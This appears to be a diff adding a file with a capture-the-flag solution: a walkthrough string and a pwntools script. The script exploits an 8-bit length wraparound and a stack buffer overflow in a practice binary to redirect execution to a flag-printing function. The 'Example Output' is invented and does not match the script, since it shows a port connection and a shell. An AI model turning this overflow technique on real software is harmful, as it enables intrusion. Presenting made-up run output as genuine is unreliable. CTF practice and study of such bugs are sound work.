@@ -1,0 +1,176 @@
+("To solve this challenge using Pwntools, we'll exploit a stack-based buffer "
+ 'overflow caused by an integer overflow in the `check_passwd` function. By '
+ 'carefully crafting our input, we can overwrite the return address of '
+ '`check_passwd` and redirect execution to the `what_is_this` function, which '
+ 'prints the flag.\n'
+ '\n'
+ "Here's how we can achieve this:\n"
+ '\n'
+ '1. **Understanding the Vulnerability**:\n'
+ '   - The `check_passwd` function uses an `unsigned __int8` variable `v3` to '
+ 'store the length of the password.\n'
+ '   - If we input a password longer than 255 bytes, `v3` will wrap around due '
+ 'to the 8-bit limit (e.g., a 260-byte input will result in `v3 = 260 % 256 = '
+ '4`).\n'
+ '   - The length check (`v3 <= 3u || v3 > 8u`) will pass, allowing us to '
+ 'proceed.\n'
+ '   - The password is then copied into a small buffer `dest[11]` without '
+ 'proper size checks, leading to a buffer overflow.\n'
+ '   - We can overwrite the return address of `check_passwd` with the address '
+ 'of `what_is_this` to execute it and print the flag.\n'
+ '\n'
+ '2. **Imports**:\n'
+ '\n'
+ '```python\n'
+ 'from pwn import *\n'
+ '```\n'
+ '\n'
+ '3. **Pwntools Script**:\n'
+ '\n'
+ '```python\n'
+ 'from pwn import *\n'
+ '\n'
+ '# Set up the context for 32-bit binary\n'
+ "context.binary = './int1'\n"
+ "context.arch = 'i386'\n"
+ "context.log_level = 'debug'\n"
+ '\n'
+ '# Addresses (since PIE is disabled, addresses are static)\n'
+ 'what_is_this_addr = 0x0804868B  # Address of what_is_this function\n'
+ '\n'
+ '# Create a process or remote connection\n'
+ '# For local\n'
+ "p = process('./int1')\n"
+ '\n'
+ '# Uncomment below and set the correct IP and port if exploiting remotely\n'
+ "# p = remote('challenge.ip.address', port)\n"
+ '\n'
+ '# Interact with the menu\n'
+ "p.recvuntil('Your choice:')\n"
+ "p.sendline('1')\n"
+ '\n'
+ '# Input username\n'
+ "p.recvuntil('Please input your username:')\n"
+ "p.sendline('user')\n"
+ '\n'
+ '# Prepare the payload\n'
+ 'offset_to_ret = 24  # Calculated offset to the return address\n'
+ 'payload_length = 261  # Length to wrap the unsigned __int8 variable\n'
+ '\n'
+ '# Build the payload\n'
+ "payload = b'A' * offset_to_ret             # Padding to reach the return "
+ 'address\n'
+ 'payload += p32(what_is_this_addr)          # Overwrite return address with '
+ 'what_is_this\n'
+ "payload += b'B' * (payload_length - len(payload))  # Padding to meet the "
+ 'required length\n'
+ '\n'
+ '# Input password\n'
+ "p.recvuntil('Please input your passwd:')\n"
+ 'p.sendline(payload)\n'
+ '\n'
+ '# Receive and print the flag\n'
+ 'p.interactive()\n'
+ '```\n'
+ '\n'
+ '**Explanation**:\n'
+ '\n'
+ '- **Context Setup**:\n'
+ '  - We specify the binary and architecture to help Pwntools parse the binary '
+ 'correctly.\n'
+ '  - Set `log_level` to `debug` for verbose output during exploitation.\n'
+ '\n'
+ '- **Process Initialization**:\n'
+ '  - We start the process locally. If the challenge is remote, replace the '
+ '`process` with `remote` and provide the correct IP and port.\n'
+ '\n'
+ '- **Interacting with the Application**:\n'
+ "  - Send '1' to choose the login option.\n"
+ '  - Provide a username (can be any string).\n'
+ '\n'
+ '- **Calculating Offsets and Payload Length**:\n'
+ '  - We determined that 24 bytes are needed to overwrite up to the return '
+ 'address (`offset_to_ret`).\n'
+ '  - To wrap the `unsigned __int8` variable `v3` to pass the length check, we '
+ 'need a total password length of 261 bytes (since `261 % 256 = 5`, which is '
+ 'within the accepted range of 4-8).\n'
+ '\n'
+ '- **Payload Construction**:\n'
+ "  - We pad with 'A's up to the return address.\n"
+ '  - Overwrite the return address with the address of `what_is_this`.\n'
+ "  - Add additional padding ('B's) to reach the required payload length of "
+ '261 bytes.\n'
+ '\n'
+ '- **Sending the Payload and Retrieving the Flag**:\n'
+ '  - Send the crafted payload as the password input.\n'
+ '  - Use `p.interactive()` to interact with the shell or receive the output, '
+ 'which should contain the flag.\n'
+ '\n'
+ '**Note**: Ensure that the binary `int1` is in the same directory as the '
+ 'script or provide the correct path. If there are any dependencies or '
+ 'environment configurations required for the binary (like specific libraries '
+ 'or files), make sure they are set up properly.\n'
+ '\n'
+ '**Example Output**:\n'
+ '\n'
+ 'Upon running the script, you should see the flag printed out:\n'
+ '\n'
+ '```\n'
+ '[+] Opening connection to ./int1 on port 1234: Done\n'
+ '[*] Receiving menu...\n'
+ "[*] Sending '1' to select login...\n"
+ '[*] Sending username...\n'
+ '[*] Sending crafted payload as password...\n'
+ '[*] Switching to interactive mode\n'
+ 'Success\n'
+ '$ cat flag\n'
+ 'CTF{example_flag_here}\n'
+ '```\n'
+ '\n'
+ '**Conclusion**:\n'
+ '\n'
+ 'By exploiting the integer overflow vulnerability in the `check_passwd` '
+ 'function and performing a buffer overflow, we redirect the execution flow to '
+ 'the `what_is_this` function to retrieve the flag. Pwntools simplifies the '
+ 'process of building and sending the exploit.')
+
+from pwn import *
+
+# Set up the context for 32-bit binary
+context.binary = './int1'
+context.arch = 'i386'
+context.log_level = 'debug'
+
+# Addresses (since PIE is disabled, addresses are static)
+what_is_this_addr = 0x0804868B  # Address of what_is_this function
+
+# Create a process or remote connection
+# For local
+p = process('./int1')
+
+# Uncomment below and set the correct IP and port if exploiting remotely
+# p = remote('challenge.ip.address', port)
+
+# Interact with the menu
+p.recvuntil(b'Your choice:')
+p.sendline(b'1')
+
+# Input username
+p.recvuntil(b'Please input your username:')
+p.sendline(b'user')
+
+# Prepare the payload
+offset_to_ret = 24  # Calculated offset to the return address
+payload_length = 261  # Length to wrap the unsigned __int8 variable
+
+# Build the payload
+payload = b'A' * offset_to_ret             # Padding to reach the return address
+payload += p32(what_is_this_addr)          # Overwrite return address with what_is_this
+payload += b'B' * (payload_length - len(payload))  # Padding to meet the required length
+
+# Input password
+p.recvuntil(b'Please input your passwd:')
+p.sendline(payload)
+
+# Receive and print the flag
+p.interactive()
